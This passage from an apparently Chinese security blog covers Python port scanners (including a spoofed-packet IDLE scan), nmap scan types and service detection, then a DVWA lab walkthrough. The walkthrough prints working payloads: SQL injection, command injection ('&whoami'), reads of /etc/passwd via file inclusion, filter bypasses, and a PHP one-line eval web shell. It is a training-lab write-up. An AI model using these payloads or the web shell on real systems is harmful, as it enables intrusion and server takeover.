class="keyword">not</span> <span class="keyword">in</span> port_set:</span><br><span class="line">        defualt_port.append(i)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    usage = <span class="string">&quot;Usage: %prog -i &lt;ip address&gt; -p &lt;dst port&gt;&quot;</span><span class="comment"># 输出帮助信息</span></span><br><span class="line">    parse = OptionParser(usage=usage)</span><br><span class="line">    parse.add_option(<span class="string">&quot;-i&quot;</span>, <span class="string">&#x27;--ip&#x27;</span>, <span class="built_in">type</span>=<span class="string">&quot;string&quot;</span>, dest=<span class="string">&quot;address&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;specify the IP address&quot;</span>)<span class="comment"># 获取网段地址</span></span><br><span class="line">    parse.add_option(<span class="string">&quot;-p&quot;</span>, <span class="string">&#x27;--port&#x27;</span>, <span class="built_in">type</span>=<span class="string">&quot;string&quot;</span>, dest=<span class="string">&quot;port&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;target port range,default option d&quot;</span>)</span><br><span class="line">    option, args = parse.parse_args()<span class="comment">#实例化用户输入的参数</span></span><br><span class="line">    IP = option.address</span><br><span class="line">    PORT = option.port</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[*] The TCP Connect Port Scan start&#x27;</span>)</span><br><span class="line">    <span class="comment"># PORT = input(&quot;Please Input PORT（Separated by &#x27;,&#x27;）:&gt;&quot;)</span></span><br><span class="line">    <span class="keyword">if</span> PORT==<span class="string">&quot;d&quot;</span>:</span><br><span class="line">        portList=defualt_port</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        portList = PORT.split(<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> portList:</span><br><span class="line">        <span class="keyword">if</span> i.isdigit():</span><br><span class="line">            t = threading.Thread(target=PortScanner, args=(IP, <span class="built_in">int</span>(i)))</span><br><span class="line">            <span class="comment"># args 动态参数就是传入的参数的个数是动态的</span></span><br><span class="line">            t.start()</span><br><span class="line">            t.join()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            newPortList = i.split(<span class="string">&#x27;-&#x27;</span>)</span><br><span class="line">            startPort = <span class="built_in">int</span>(newPortList[<span class="number">0</span>])</span><br><span class="line">            endPort = <span class="built_in">int</span>(newPortList[<span class="number">0</span>])</span><br><span class="line">            <span class="keyword">for</span> port <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">int</span>(newPortList[<span class="number">0</span>]), <span class="built_in">int</span>(newPortList[<span class="number">0</span>])):</span><br><span class="line">                t = threading.Thread(target=PortScanner, args=(IP, port))</span><br><span class="line">                t.start()</span><br><span class="line">                t.join()</span><br><span class="line">    setdefaulttimeout(<span class="number">1</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[*] The TCP CONNECT SCAN is complete!&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>缺陷</strong>容易被发现</p><h2 id="idle"><a class="markdownIt-Anchor" href="#idle"></a> IDLE</h2><p>不太常见，也不好用，但比较巧妙，记录下来。步骤 1：检测第三方的 IP ID 值并记录下来。步骤 2：在本机上伪造一个源地址为第三方主机的数据包，并将数据包发送给目标主机端口，根据目标端口状态的不同，目标主机可能会导致第三方主机的 IP ID 值增加。步骤 3：再回来检查第三方主机的 IP ID 值。比较这两次的值。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> optparse <span class="keyword">import</span> OptionParser</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> scapy.layers.inet <span class="keyword">import</span> IP, TCP</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">scan</span>(<span class="params">ip, port</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 步骤1：检测第三方的IP ID值并记录下来。</span></span><br><span class="line">        third_party_ip = <span class="string">&quot;192.168.42.128&quot;</span></span><br><span class="line">        packet = IP(dst=third_party_ip)</span><br><span class="line">        response = sr1(packet, timeout=<span class="number">0.5</span>, verbose=<span class="number">0</span>)</span><br><span class="line">        pre_id = response[IP].<span class="built_in">id</span></span><br><span class="line">        <span class="comment"># 步骤2：在本机上伪造一个源地址为第三方主机的数据包，并将数据包发送给目标主机端口</span></span><br><span class="line">        packet2 = IP(src=third_party_ip, dst=ip) / TCP(flags=<span class="string">&quot;S&quot;</span>, dport=port)</span><br><span class="line">        send(packet2, verbose=<span class="number">0</span>)</span><br><span class="line">        time.sleep(<span class="number">0.05</span>)</span><br><span class="line">        <span class="comment"># 步骤3：再回来检查第三方主机的IP ID值。</span></span><br><span class="line">        packet3 = IP(dst=third_party_ip)</span><br><span class="line">        response3 = sr1(packet3, timeout=<span class="number">0.5</span>, verbose=<span class="number">0</span>)</span><br><span class="line">        next_id = response3[IP].<span class="built_in">id</span></span><br><span class="line">        <span class="keyword">if</span> next_id == (pre_id + <span class="number">1</span>):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[+] PORT &quot;</span> + port + <span class="string">&quot; maybe open&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[*] Scan start&#x27;</span>)</span><br><span class="line">    IP = <span class="string">&quot;192.168.42.129&quot;</span></span><br><span class="line">    <span class="comment"># PORT = input(&quot;Please Input PORT（Separated by &#x27;,&#x27;）:&gt;&quot;)</span></span><br><span class="line">    portList = [<span class="built_in">str</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">3307</span>)]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> portList:</span><br><span class="line">        scan(IP, i)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[*] Scan complete!&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p><strong>缺陷</strong>不能并行，扫描时间较长，需第三方网络不太活跃的主机，扫描结果不一定准确这种方法网上没人写是有原因的，成功率不高。暂时想不到改进措施。</p><h2 id="其他方式-2"><a class="markdownIt-Anchor" href="#其他方式-2"></a> 其他方式</h2><p>这篇文章基本就是 NMAP 里提到的技术，配了点插图，更好理解。</p><h3 id="udp-扫描"><a class="markdownIt-Anchor" href="#udp-扫描"></a> UDP 扫描</h3><p>与 C 段扫描中说到的方法一模一样，这里提一下。UDP 扫描发送空的(没有数据)UDP 报头到每个目标端口。 如果返回 ICMP 端口不可到达错误(类型 3，代码 3)， 该端口是 closed(关闭的)。 其它 ICMP 不可到达错误(类型 3， 代码 1，2，9，10，或者 13)表明该端口是 filtered(被过滤的)。 偶尔地，某服务会响应一个 UDP 报文，证明该端口是 open(开放的)。 如果几次重试后还没有响应，该端口就被认为是 open|filtered(开放|被过滤的)。 这意味着该端口可能是开放的，也可能包过滤器正在封锁通信。</p><p>| ICMP 端口不可到达错误(类型 3，代码 3)                 | closed   || ----------------------------------------------------- | -------- | -------- || ICMP 不可到达错误(类型 3， 代码 1，2，9，10，或者 13) | filtered || 响应                                                  | open     || 重试未响应                                            | open     | filtered |</p><h3 id="tcp-nullfinand-xmas-扫描"><a class="markdownIt-Anchor" href="#tcp-nullfinand-xmas-扫描"></a> TCP Null，FIN，and Xmas 扫描</h3><p>如果 [目标]端口状态是关闭的.... 进入的不含 RST 的报文导致一个 RST 响应 如果扫描系统遵循该 RFC，当端口关闭时，任何不包含 SYN，RST，或者 ACK 位的报文会导致 一个 RST 返回；而当端口开放时，应该没有任何响应。如果收到一个 RST 报文，该端口被认为是 closed，而没有响应则意味着 端口 open|filtered。 如果收到 ICMP 不可到达错误(类型 3，代号 1，2，3，9，10，或者 13)，该端口 filtered。可以通过一些无状态防火墙和报文过滤路由器 ，比 SYN 扫描还要隐秘一些</p><h3 id="tcp-ack-扫描"><a class="markdownIt-Anchor" href="#tcp-ack-扫描"></a> TCP ACK 扫描</h3><p>这种扫描技术无法确定端口的开放性，因为它做的就是发送一个 ACK 报文，但服务端在收到该报文时，无论端口是否开放(open/closed)，只要未被过滤，都会返回一个 RST 报文，将它们认为是 unfiltered，而当扫描一个端口未得到响应时则认为是 filtered，同样的 ICMP 不可达也认为是 filtered。</p><table><thead><tr><th>行为</th><th>状态</th></tr></thead><tbody><tr><td>收到 RST 报文</td><td>unfiltered(open/closed)</td></tr><tr><td>未响应</td><td>filtered</td></tr><tr><td>ICMP 不可达</td><td>filtered</td></tr></tbody></table><h3 id="tcp-窗口扫描"><a class="markdownIt-Anchor" href="#tcp-窗口扫描"></a> TCP 窗口扫描</h3><p>发送一个 ACK 报文，到目标关闭的端口，会发现 window 的字段为 0。可以根据 window 值是正值 or 0 来判断目标端口是 open 还是 closed。现在大多数情况都不管用了。</p><h3 id="tcp-maimon-扫描"><a class="markdownIt-Anchor" href="#tcp-maimon-扫描"></a> TCP Maimon 扫描</h3><p>这个名称是用此项扫描提出者 Uriel Maimon 的名字命名的。这项技术和 Null，FIN，以及 Xmas 扫描是一样的，但是要注意它的探测报文使用的是 FIN/ACK。根据 RFC 793 (TCP)，无论端口开放或者关闭，都应该对这样的探测响应 RST 报文。 然而，Uriel 注意到如果端口开放，许多基于 BSD 的系统只是丢弃该探测报文。</p><h3 id="ftp-弹跳扫描"><a class="markdownIt-Anchor" href="#ftp-弹跳扫描"></a> FTP 弹跳扫描</h3><p>允许用户连接到一台 FTP 服务器，然后要求文件送到一台第三方服务器。请求 FTP 服务器轮流发送一个文件到目标主机上的所感兴趣的端口。 错误消息会描述端口是开放还是关闭的。</p><h1 id="服务识别"><a class="markdownIt-Anchor" href="#服务识别"></a> 服务识别</h1><h2 id="默认端口"><a class="markdownIt-Anchor" href="#默认端口"></a> 默认端口</h2><p>比较无脑的方法是默认应用不会改变其运行的默认端口，只需将端口扫描的结果与常见应用所占端口对比就可以确定该端口上运行的服务。显然现实总不能如我们所愿，如果服务运行在奇奇怪怪的端口，或者用了别的服务的默认端口，直接查表显然是不科学的。</p><h2 id="banner-信息"><a class="markdownIt-Anchor" href="#banner-信息"></a> banner 信息</h2><p>除此之外，有一个相对简单的方式就是通过无阻塞套接字和探查，然后对响应进行匹配以期得到一个正确的探测结果，在使用 nmap 探测一个 nc 监听的端口时会发现收到了一个 GET / HTTP/1.0。那么同样可以使用 python 的 socket 发送它来得到服务响应。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># TCP端口探测（TCP服务被动识别）</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">TcpPort</span>(<span class="params">ip, port</span>):</span><br><span class="line">    banner = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    status = <span class="number">0</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        sock.settimeout(<span class="number">3</span>)</span><br><span class="line">        sock.connect((ip, port))</span><br><span class="line">        status = <span class="number">1</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="comment"># 被动服务识别</span></span><br><span class="line">    <span class="keyword">if</span> status:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            banner = sock.recv(<span class="number">1024</span>)</span><br><span class="line">            <span class="keyword">return</span> &#123;<span class="string">&quot;banner&quot;</span>: banner, <span class="string">&quot;port&quot;</span>: port&#125;</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> &#123;<span class="string">&quot;banner&quot;</span>: banner, <span class="string">&quot;port&quot;</span>: port&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/c4ooc0/blog-image/blog/images/Fi-1aE8NjmAZsqQF6Gi0OmOq9IKn.png" alt="" />可以看到结果中，http 服务没有返回 banner，该方法也存在局限性。</p><h2 id="payload"><a class="markdownIt-Anchor" href="#payload"></a> payload</h2><p>首先看一下 nmap 能扫出来的东西：<img src="https://cdn.jsdelivr.net/gh/c4ooc0/blog-image/blog/images/FhVkgrolRppCmHsB5nvPhisZ1qa_.png" alt="" />在<a href="http://www.nmap.com.cn/doc/manual.shtm#8">Nmap 参考指南中文版</a>中提到，nmap 会使用 nmap-service-probes 文件，里面存放着不同服务的探测报文和解析识别响应的匹配表达式。正常人应该会直接使用 nmap 吧？</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> nmap</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">NmapScan</span>(<span class="params">targetIP, targetPort</span>):</span><br><span class="line">    <span class="comment"># 实例化PortScanner对象</span></span><br><span class="line">    nm = nmap.PortScanner()</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># hosts为目标IP地址,argusments为Nmap的扫描参数</span></span><br><span class="line">        <span class="comment"># -p:对指定端口进行扫描</span></span><br><span class="line">        <span class="comment"># -sV:对端口进行服务程序探测</span></span><br><span class="line">        result = nm.scan(hosts=targetIP, arguments=<span class="string">&#x27;-sV -p&#x27;</span> + <span class="built_in">str</span>(targetPort))</span><br><span class="line">        <span class="comment"># 对结果进行切片，提取端口信息</span></span><br><span class="line">        <span class="comment"># 这里需要注意的是,提取信息时需要把端口转化为int型</span></span><br><span class="line">        port_infor = result[<span class="string">&#x27;scan&#x27;</span>][targetIP][<span class="string">&#x27;tcp&#x27;</span>][<span class="built_in">int</span>(targetPort)]</span><br><span class="line">        <span class="comment"># 分别显示  端口号：端口状态 端口服务:端口服务程序</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[&#123;&#125;:&#123;&#125;] : [&#123;&#125;:&#123;&#125;]&quot;</span>.<span class="built_in">format</span>(targetPort, port_infor[<span class="string">&#x27;state&#x27;</span>], port_infor[<span class="string">&#x27;name&#x27;</span>], port_infor[<span class="string">&#x27;product&#x27;</span>]))</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(e)</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/c4ooc0/blog-image/blog/images/Ftyb7oUY-TYhQe9rQpIFr2b6GHD4.png" alt="" />当然 nmap 也有识别不准的时候，参考之前提到的博客，可以自己抓包获取 payload，针对特定服务，会更加准确些。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>DVWA 攻略经历</title>
      <link href="/2022/06/13/DVWA%20%E6%94%BB%E7%95%A5%E7%BB%8F%E5%8E%86/"/>
      <url>/2022/06/13/DVWA%20%E6%94%BB%E7%95%A5%E7%BB%8F%E5%8E%86/</url>
      
        <content type="html"><![CDATA[<blockquote><p>竟然写完了部署到云服务器上了</p></blockquote> <span id="more"></span><p><a href="https://blog.csdn.net/u014029795/article/details/100006641">DVWA 攻略</a>写的很好了，这里仅作一些知识点备忘录</p><h1 id="brute-force"><a class="markdownIt-Anchor" href="#brute-force"></a> Brute Force</h1><p>可以通过 php 代码发现，用户名没有做任何过滤，但密码取 md5，之后就是 sql 语句了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Get username</span></span><br><span class="line"><span class="variable">$user</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;username&#x27;</span> ];</span><br><span class="line"></span><br><span class="line"><span class="comment">// Get password</span></span><br><span class="line"><span class="variable">$pass</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;password&#x27;</span> ];</span><br><span class="line"><span class="variable">$pass</span> = <span class="title function_ invoke__">md5</span>( <span class="variable">$pass</span> );</span><br></pre></td></tr></table></figure><ul><li>爆破，根据 echo 可以看出攻击者不能区分用户名错还是密码错，于是用户名和密码需要组合爆破</li><li>因为用户名没有做任何过滤，可以使用 sql 注入<code>admin’ or '1′='1</code></li></ul><p>BurpSuite 爆破步骤</p><blockquote><p>用 Java 命令运行 bp 的 jar 包，获得更大的 jvm 内存java17+burpsuitecommunity2022 运行命令：<code>java -Xmx2048M --add-opens=java.desktop/javax.swing=ALL-UNNAMED --add-opens=java.base/java.lang=ALL-UNNAMED -jar BP路径\burpsuite_community.jar </code>使用批处理文件实现，遇到 jar 路径有空格，命令报错，解决方法：整个路径加双引号</p></blockquote><ol><li>服务器设置代理，BP 拦截，抓到登录点 login 发出的包</li><li>发送到 Intruder 模块来进行爆破，在 Position 中的 Attack type 选择 cluster boomb，清除其它的爆破项，选择用户名和密码两个字段进行爆破</li><li>在 Payloads 中为两个字段设置字典，新版 BP 在选择 resource pool 下面有个 create new source pool 可以重新设置线程数，勾选 maximum concurrent <a href="https://so.csdn.net/so/search?q=requests&amp;spm=1001.2101.3001.7020">requests</a>，并且进行参数的设置，Attack 开始</li><li>看到 length 有变，基本就差不错了</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Sanitise username input</span></span><br><span class="line"><span class="variable">$user</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;username&#x27;</span> ];</span><br><span class="line"><span class="variable">$user</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$user</span> ) : ((<span class="title function_ invoke__">trigger_error</span>(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">// Sanitise password input</span></span><br><span class="line"><span class="variable">$pass</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;password&#x27;</span> ];</span><br><span class="line"><span class="variable">$pass</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$pass</span> ) : ((<span class="title function_ invoke__">trigger_error</span>(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"><span class="variable">$pass</span> = <span class="title function_ invoke__">md5</span>( <span class="variable">$pass</span> );</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>Medium 级别的代码主要增加了 mysql_real_escape_string 函数，这个函数会对字符串中的特殊符号（x00，n，r，，’，”，x1a）进行转义，基本上能够抵御 sql 注入攻击(宽字节注入可以搞定)，但是，依然没有加入有效的防爆破机制</p><h1 id="command-injection"><a class="markdownIt-Anchor" href="#command-injection"></a> Command Injection</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Determine OS and execute the ping command.</span></span><br><span class="line"><span class="keyword">if</span>( <span class="title function_ invoke__">stristr</span>( <span class="title function_ invoke__">php_uname</span>( <span class="string">&#x27;s&#x27;</span> ), <span class="string">&#x27;Windows NT&#x27;</span> ) ) &#123;</span><br><span class="line">    <span class="comment">// Windows</span></span><br><span class="line">    <span class="variable">$cmd</span> = <span class="title function_ invoke__">shell_exec</span>( <span class="string">&#x27;ping  &#x27;</span> . <span class="variable">$target</span> );</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// *nix</span></span><br><span class="line">    <span class="variable">$cmd</span> = <span class="title function_ invoke__">shell_exec</span>( <span class="string">&#x27;ping  -c 4 &#x27;</span> . <span class="variable">$target</span> );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>前端输入一个 ip 地址，后端 ping，因为没有做过滤，ip 地址后面跟&amp;命令即可<code>127.0.0.1&amp;whoami</code></p><ul><li>字符过滤</li></ul><p><a href="https://linux.cn/article-2469-1.html#:~:text=Linux%E4%B8%AD%E5%91%BD%E4%BB%A4%E9%93%BE%E6%8E%A5%E6%93%8D%E4%BD%9C%E7%AC%A6%E7%9A%84%E5%8D%81%E4%B8%AA%E6%9C%80%E4%BD%B3%E5%AE%9E%E4%BE%8B%201%20%E5%92%8C%E5%8F%B7%E6%93%8D%E4%BD%9C%E7%AC%A6%20%28%26%29%202%20%E5%88%86%E5%8F%B7%E6%93%8D%E4%BD%9C%E7%AC%A6%20%28%3B%29%203,%E4%BC%98%E5%85%88%E6%93%8D%E4%BD%9C%E7%AC%A6%20%28%29%20Command_x1%20%26%26Comma%20...%2010%20%E8%BF%9E%E6%8E%A5%E7%AC%A6%20%28%5C%29">Linux 中命令链接操作符</a>例如 medium 过滤了&quot;&amp;&amp;” 、”;”,用别的字符代替就好，例如“&amp;”“|”等。hard 过滤表：'&amp;' =&gt; '',';' =&gt; '','| ' =&gt; '','-' =&gt; '','$' =&gt; '','(' =&gt; '',')' =&gt; '','`' =&gt; '','||' =&gt; '',|后有个空格，不加空格就行</p><h1 id="csrf"><a class="markdownIt-Anchor" href="#csrf"></a> CSRF</h1><p>CSRF，全称 Cross-site request forgery，翻译过来就是跨站请求伪造，是指利用受害者尚未失效的身份认证信息（cookie、会话等），诱骗其点击恶意链接或者访问包含攻击代码的页面，在受害人不知情的情况下以受害者的身份向（身份认证信息所对应的）服务器发送请求，从而完成非法操作（如转账、改密等）。构造链接<a href="http://127.0.0.1/dvwa/vulnerabilities/csrf/?password_new=123456&amp;password_conf=123456&amp;Change=Change#">http://127.0.0.1/dvwa/vulnerabilities/csrf/?password_new=123456&amp;password_conf=123456&amp;Change=Change#</a>有验证：<code> if( stripos( $_SERVER[ 'HTTP_REFERER' ] ,$_SERVER[ 'SERVER_NAME' ]) !== false )</code>stripos 检查 string 中是第一次出现 pattern 的位置（不区分大小写）</p><h3 id="anti-csrf-token"><a class="markdownIt-Anchor" href="#anti-csrf-token"></a> Anti-csrf token</h3><p>安装插件 CSRF Token Tracke</p><h1 id="file-inclusion"><a class="markdownIt-Anchor" href="#file-inclusion"></a> File Inclusion</h1><p><code>$file = $_GET[ 'page' ];</code>没有验证，直接改 page 参数：<code>?page=/etc/passwd</code></p><h2 id="远程文件包含"><a class="markdownIt-Anchor" href="#远程文件包含"></a> 远程文件包含</h2><p>当服务器的 php 配置中，选项 allow_url_fopen 与 allow_url_include 为开启状态时，服务器会允许包含远程服务器上的文件，如果对文件来源没有检查的话，就容易导致任意远程代码执行。使用下面的 url 来去访问另外一台设备上的文件。/dvwa/vulnerabilities/fi/?page=<a href="http://192.168.181.203:8012">http://192.168.181.203:8012</a><a href="https://blog.csdn.net/u014029795/article/details/102781669"></a></p><h2 id="过滤"><a class="markdownIt-Anchor" href="#过滤"></a> 过滤</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// The page we wish to display</span></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;page&#x27;</span> ];</span><br><span class="line"></span><br><span class="line"><span class="comment">// Input validation</span></span><br><span class="line"><span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>( <span class="keyword">array</span>( <span class="string">&quot;http://&quot;</span>, <span class="string">&quot;https://&quot;</span> ), <span class="string">&quot;&quot;</span>, <span class="variable">$file</span> );</span><br><span class="line"><span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>( <span class="keyword">array</span>( <span class="string">&quot;../&quot;</span>, <span class="string">&quot;..\&quot;&quot;</span> ), <span class="string">&quot;&quot;</span>, <span class="variable">$file</span> );</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>使用 str_replace 函数是极其不安全的，因为可以使用双写绕过替换规则。同时，因为替换的只是“…/”、“…\”，所以对采用绝对路径的方式包含文件是不会受到任何限制的。/dvwa/vulnerabilities/fi/<code>?page=/etc/passwd</code> 依旧可以</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>( !<span class="title function_ invoke__">fnmatch</span>( <span class="string">&quot;file*&quot;</span>, <span class="variable">$file</span> ) &amp;&amp; <span class="variable">$file</span> != <span class="string">&quot;include.php&quot;</span> )</span><br></pre></td></tr></table></figure><p>开头必须是 file，可以用 file 协议绕过：<code>?page=file:///etc/passwd</code><a href="https://linux.cn/article-2469-1.html#:~:text=Linux%E4%B8%AD%E5%91%BD%E4%BB%A4%E9%93%BE%E6%8E%A5%E6%93%8D%E4%BD%9C%E7%AC%A6%E7%9A%84%E5%8D%81%E4%B8%AA%E6%9C%80%E4%BD%B3%E5%AE%9E%E4%BE%8B%201%20%E5%92%8C%E5%8F%B7%E6%93%8D%E4%BD%9C%E7%AC%A6%20%28%26%29%202%20%E5%88%86%E5%8F%B7%E6%93%8D%E4%BD%9C%E7%AC%A6%20%28%3B%29%203,%E4%BC%98%E5%85%88%E6%93%8D%E4%BD%9C%E7%AC%A6%20%28%29%20Command_x1%20%26%26Comma%20...%2010%20%E8%BF%9E%E6%8E%A5%E7%AC%A6%20%28%5C%29"></a></p><h1 id="文件上传"><a class="markdownIt-Anchor" href="#文件上传"></a> 文件上传</h1><p>php 一句话木马：<code>&lt;?php @eval($_POST['shell'])?&gt;</code>上传成功后用蚁剑或者菜刀连接遇到几个小问题：</p><ul><li>蚁剑的使用方法：<ul><li>url 处须填上传的文件所在地址</li><li>密码处填单引号里的内容，以上文为例，填 shell</li></ul></li><li>指定文件类型<ul><li>bp 抓包，改文件内容处的 Content-Type</li><li><code>copy 1.jpg/b + muma.php/a muma.jpg</code> - 参数/b 指定以二进制格式复制、合并文件; 用于图像类/声音类文件参数/a 指定以 ASCII 格式复制、合并文件。用于 txt 等文档类文件 - 需结合命令注入漏洞，把<code>muma.jpg</code>改成<code>muma.php</code></li></ul></li></ul><p>hard 难度仅在包里改文件后缀和 